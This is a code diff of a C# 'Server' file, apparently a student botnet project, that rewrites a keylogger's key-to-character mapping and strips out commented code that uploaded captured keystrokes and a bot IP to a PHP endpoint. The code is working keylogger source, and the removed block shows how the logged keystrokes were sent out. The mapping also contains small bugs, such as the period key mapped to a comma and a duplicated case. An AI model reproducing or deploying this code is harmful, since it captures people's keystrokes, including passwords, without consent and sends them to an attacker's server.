@@ -49,10 +49,7 @@ namespace Server
         public static void StartKeylogger()
         {
             isStarted = true;
-
-            //File.Create(pathKeylogger);
-            // Mở tệp để ghi lại (nếu tệp không tồn tại, nó sẽ tự động được tạo ra)
-            using (StreamWriter writer = new StreamWriter(pathKeylogger, false)) // Truyền tham số 'false' để ghi đè tệp hiện có
+            using (StreamWriter writer = new StreamWriter(pathKeylogger, false)) 
             {
             }
             Console.WriteLine("Keylogger started.");
@@ -180,90 +177,428 @@ namespace Server
 
                 }
             }
-            return replaceStrings(pressedKey);
+            return replaceStrings(pressedKey,isCaps());
         }
-        private static string replaceStrings(string input)
+        private static string replaceStrings(string input,bool cap)
         {
             string replacedKey = input;
-            switch (input)
+            if(!input.Trim().Equals(""))
             {
-                case "space":
-                case "Space":
-                    replacedKey = " ";
-                    break;
-                case "return":
-                    replacedKey = "\r\n";
-                    break;
-                case "escape":
-                    replacedKey = "[ESC]";
-                    break;
-                case "leftctrl":
-                    replacedKey = "[CTRL]";
-                    break;
-                case "rightctrl":
-                    replacedKey = "[CTRL]";
-                    break;
-                case "RightShift":
-                case "rightshift":
-                    replacedKey = "";
-                    break;
-                case "LeftShift":
-                case "leftshift":
-                    replacedKey = "";
-                    break;
-                case "back":
-                    replacedKey = "[Back]";
-                    break;
-                case "lWin":
-                    replacedKey = "[WIN]";
-                    break;
-                case "tab":
-                    replacedKey = "[Tab]";
-                    break;
-                case "Capital":
-                    replacedKey = "";
-                    break;
-                case "oemperiod":
-                    replacedKey = ".";
-                    break;
-                case "D1":
-                    replacedKey = "!";
-                    break;
-                case "D2":
-                    replacedKey = "@";
-                    break;
-                case "oemcomma":
-                    replacedKey = ",";
-                    break;
-                case "oem1":
-                    replacedKey = ";";
-                    break;
-                case "Oem1":
-                    replacedKey = ":";
-                    break;
-                case "oem5":
-                    replacedKey = "\\";
-                    break;
-                case "oemquotes":
-                    replacedKey = "'";
-                    break;
-                case "OemQuotes":
-                    replacedKey = "\"";
-                    break;
-                case "oemminus":
-                    replacedKey = "-";
-                    break;
-                case "delete":
-                    replacedKey = "[DEL]";
-                    break;
-                case "oemquestion":
-                    replacedKey = "/";
-                    break;
-                case "OemQuestion":
-                    replacedKey = "?";
-                    break;
+                Console.WriteLine(input);
+            }  
+            
+            if(input.Equals("space") || input.Equals("Space"))
+            {
+                replacedKey = " ";
+            } 
+            else if(input.Equals("return") || input.Equals("Return"))
+            {
+                replacedKey = "\r\n";
             }
+            else if (input.Equals("escape")|| input.Equals("Escape"))
+            {
+                replacedKey = "[ESC]";
+            }
+            else if (input.Equals("RightShift") || input.Equals("LeftShift"))
+            {
+                replacedKey = "[SHIFT]";
+            }
+            else if (input.Equals("leftctrl") || input.Equals("LeftCtrl")|| input.Equals("rightctrl") || input.Equals("RightCtrl"))
+            {
+                replacedKey = "[CTRL]";
+            }
+            else if (input.Equals("leftalt") || input.Equals("LeftAlt") || input.Equals("rightalt") || input.Equals("RightAlt"))
+            {
+                replacedKey = "[ALT]";
+            }
+            else if (input.Equals("back") || input.Equals("Back"))
+            {
+                replacedKey = "[BACK]";
+            }
+            else if (input.Equals("lwin") || input.Equals("LWin"))
+            {
+                replacedKey = "[WIN]";
+            }
+            else if (input.Equals("tab") || input.Equals("Tab"))
+            {
+                replacedKey = "[TAB]";
+            }
+            else if (input.Equals("capital") || input.Equals("Capital"))
+            {
+                replacedKey = "";
+            }
+            else if (input.Equals("oemcomma"))
+            {
+                replacedKey = ",";
+            }
+            else if (input.Equals("OemComma"))
+            {
+                if(cap == true)
+                {
+                    replacedKey = ",";
+                }
+                else
+                {
+                    replacedKey = "<";
+                }
+            }
+            else if (input.Equals("oemperiod"))
+            {
+                replacedKey = ",";
+            }
+            else if (input.Equals("OemPeriod"))
+            {
+                if (cap == true)
+                {
+                    replacedKey = ".";
+                }
+                else
+                {
+                    replacedKey = ">";
+                }
+            }
+            else if (input.Equals("oemquestion"))
+            {
+                replacedKey = "/";
+            }
+            else if (input.Equals("OemQuestion"))
+            {
+                if (cap == true)
+                {
+                    replacedKey = "/";
+                }
+                else
+                {
+                    replacedKey = "?";
+                }
+            }
+            else if (input.Equals("oem1"))
+            {
+                replacedKey = ";";
+            }
+            else if (input.Equals("Oem1"))
+            {
+                if (cap == true)
+                {
+                    replacedKey = ";";
+                }
+                else
+                {
+                    replacedKey = ":";
+                }
+            }
+            else if (input.Equals("oemquotes"))
+            {
+                replacedKey = "'";
+            }
+            else if (input.Equals("OemQuotes"))
+            {
+                if (cap == true)
+                {
+                    replacedKey = "'";
+                }
+                else
+                {
+                    replacedKey = "\"";
+                }
+            }
+            else if (input.Equals("oemopenbrackets"))
+            {
+                replacedKey = "["; 
+            }
+            else if (input.Equals("OemOpenBrackets"))
+            {
+                if (cap == true)
+                {
+                    replacedKey = "[";
+                }
+                else
+                {
+                    replacedKey = "{";
+                }
+            }
+            else if (input.Equals("oem6"))
+            {
+                replacedKey = "]";
+            }
+            else if (input.Equals("Oem6"))
+            {
+                if (cap == true)
+                {
+                    replacedKey = "]";
+                }
+                else
+                {
+                    replacedKey = "}";
+                }
+            }
+            else if (input.Equals("d1"))
+            {
+                replacedKey = "1";
+            }
+            else if (input.Equals("D1"))
+            {
+                if (cap == true)
+                {
+                    replacedKey = "1";
+                }
+                else
+                {
+                    replacedKey = "!";
+                }
+            }
+            else if (input.Equals("d2"))
+            {
+                replacedKey = "2";
+            }
+            else if (input.Equals("D2"))
+            {
+                if (cap == true)
+                {
+                    replacedKey = "2";
+                }
+                else
+                {
+                    replacedKey = "@";
+                }
+            }
+            else if (input.Equals("d3"))
+            {
+                replacedKey = "3";
+            }
+            else if (input.Equals("D3"))
+            {
+                if (cap == true)
+                {
+                    replacedKey = "3";
+                }
+                else
+                {
+                    replacedKey = "#";
+                }
+            }
+            else if (input.Equals("d4"))
+            {
+                replacedKey = "4";
+            }
+            else if (input.Equals("D4"))
+            {
+                if (cap == true)
+                {
+                    replacedKey = "4";
+                }
+                else
+                {
+                    replacedKey = "$";
+                }
+            }
+            else if (input.Equals("d5"))
+            {
+                replacedKey = "5";
+            }
+            else if (input.Equals("D5"))
+            {
+                if (cap == true)
+                {
+                    replacedKey = "5";
+                }
+                else
+                {
+                    replacedKey = "%";
+                }
+            }
+            else if (input.Equals("d6"))
+            {
+                replacedKey = "6";
+            }
+            else if (input.Equals("D6"))
+            {
+                if (cap == true)
+                {
+                    replacedKey = "6";
+                }
+                else
+                {
+                    replacedKey = "^";
+                }
+            }
+            else if (input.Equals("d7"))
+            {
+                replacedKey = "7";
+            }
+            else if (input.Equals("D7"))
+            {
+                if (cap == true)
+                {
+                    replacedKey = "7";
+                }
+                else
+                {
+                    replacedKey = "&";
+                }
+            }
+            else if (input.Equals("d8"))
+            {
+                replacedKey = "8";
+            }
+            else if (input.Equals("D8"))
+            {
+                if (cap == true)
+                {
+                    replacedKey = "8";
+                }
+                else
+                {
+                    replacedKey = "*";
+                }
+            }
+            else if (input.Equals("d9"))
+            {
+                replacedKey = "9";
+            }
+            else if (input.Equals("D9"))
+            {
+                if (cap == true)
+                {
+                    replacedKey = "9";
+                }
+                else
+                {
+                    replacedKey = "(";
+                }
+            }
+            else if (input.Equals("d0"))
+            {
+                replacedKey = "0";
+            }
+            else if (input.Equals("D0"))
+            {
+                if (cap == true)
+                {
+                    replacedKey = "0";
+                }
+                else
+                {
+                    replacedKey = ")";
+                }
+            }
+            else if (input.Equals("oemminus"))
+            {
+                replacedKey = "-";
+            }
+            else if (input.Equals("OemMinus"))
+            {
+                if (cap == true)
+                {
+                    replacedKey = "-";
+                }
+                else
+                {
+                    replacedKey = "_";
+                }
+            }
+            else if (input.Equals("oemplus"))
+            {
+                replacedKey = "=";
+            }
+            else if (input.Equals("OemPlus"))
+            {
+                if (cap == true)
+                {
+                    replacedKey = "=";
+                }
+                else
+                {
+                    replacedKey = "+";
+                }
+            }
+            else if (input.Equals("oem5"))
+            {
+                replacedKey = "\\";
+            }
+            else if (input.Equals("Oem5"))
+            {
+                if (cap == true)
+                {
+                    replacedKey = "\\";
+                }
+                else
+                {
+                    replacedKey = "|";
+                }
+            }
+            else if (input.Equals("delete")|| input.Equals("Delete"))
+            {
+                replacedKey = "[DELETE]";
+            }
+            else if (input.Equals("divide") || input.Equals("Divide"))
+            {
+                replacedKey = "/";
+            }
+            else if (input.Equals("divide") || input.Equals("Divide"))
+            {
+                replacedKey = "/";
+            }
+            else if (input.Equals("multiply") || input.Equals("Multiply"))
+            {
+                replacedKey = "*";
+            }
+            else if (input.Equals("subtract") || input.Equals("Subtract"))
+            {
+                replacedKey = "-";
+            }
+            else if (input.Equals("add") || input.Equals("Add"))
+            {
+                replacedKey = "+";
+            }
+            else if (input.Equals("decimal") || input.Equals("Decimal"))
+            {
+                replacedKey = ".";
+            }
+            else if (input.Equals("numpad0") || input.Equals("NumPad0"))
+            {
+                replacedKey = "0";
+            }
+            else if (input.Equals("numpad1") || input.Equals("NumPad1"))
+            {
+                replacedKey = "1";
+            }
+            else if (input.Equals("numpad2") || input.Equals("NumPad2"))
+            {
+                replacedKey = "2";
+            }
+            else if (input.Equals("numpad3") || input.Equals("NumPad3"))
+            {
+                replacedKey = "3";
+            }
+            else if (input.Equals("numpad4") || input.Equals("NumPad4"))
+            {
+                replacedKey = "4";
+            }
+            else if (input.Equals("numpad5") || input.Equals("NumPad5"))
+            {
+                replacedKey = "5";
+            }
+            else if (input.Equals("numpad6") || input.Equals("NumPad6"))
+            {
+                replacedKey = "6";
+            }
+            else if (input.Equals("numpad7") || input.Equals("NumPad7"))
+            {
+                replacedKey = "7";
+            }
+            else if (input.Equals("numpad8") || input.Equals("NumPad8"))
+            {
+                replacedKey = "8";
+            }
+            else if (input.Equals("numpad9") || input.Equals("NumPad9"))
+            {
+                replacedKey = "9";
+            }
+            else
+            {
 
+            };
             return replacedKey;
         }
 
@@ -282,33 +617,6 @@ namespace Server
             Process process = Process.GetProcessById((int)processId);
             return process.ProcessName;
         }
-
-        // Các hàm dưới này dùng để lấy dữ liệu đã được ghi trong file keylogger sau đó ghi UploadString vào file php, từ php cập nhật csdl
-        //static void onTimedEvent(object sender, EventArgs e)
-        //{
-        //    Program program = new Program();
-        //    String ipBotActive = Program.ipBotActive;
-        //    if (!isStarted) return;
-        //    try
-        //    {
-        //        webclient.Headers.Add("Content-Type", "application/x-www-form-urlencoded");
-        //        webclient.UploadString("http://localhost/PBL4/sendkeylog.php", "bot=" + ipBotActive + "&keylogger=" + GetKeystrokes());
-        //    }
-        //    catch (Exception)
-        //    {
-        //        System.Threading.Thread.Sleep(5000); //If No Client
-        //    }
-        //}
-
-        ////--[ get keystrokes ]--
-        //public static string GetKeystrokes()
-        //{
-
-        //    string logNameToRead = logName + DateTime.Now.ToLongDateString() + logExtendtion;
-        //    string logContents = File.ReadAllText(logNameToRead);
-        //    return logContents;
-        //}
-
         #endregion
     }
 }
